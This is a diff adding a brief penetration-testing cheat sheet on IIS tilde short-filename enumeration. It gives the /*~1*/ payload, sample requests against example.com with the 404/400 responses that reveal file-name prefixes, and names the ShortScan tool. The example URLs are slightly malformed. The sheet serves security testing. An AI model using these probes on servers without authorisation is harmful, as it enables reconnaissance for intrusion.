@@ -1,0 +1,30 @@
+Microsoft IIS Tilde
+--------------------
+
+- Change method to OPTIONS.
+- Use this payload: /*~1*/
+
+
+Example Attack
+---------------------
+
+http:/example.com/*~1*/.aspx   
+//Response: 404 
+Valid: One or more file with short names are found in the server
+
+http:/example.com/e*~1*/.aspx  
+//Response: 404 
+Valid: One or more files beginning with “e” are present on the server
+
+http:/example.com/eb*~1*/.aspx 
+//Response: 400
+Invalid: There is no file whose  name starts with “eb” on the server
+
+http:/example.com/ex*~1*/.aspx 
+//Response: 404 
+Valid: There is a file whose name starts with “ex”.
+
+
+Automatized Tool
+----------------------
+- ShortScan
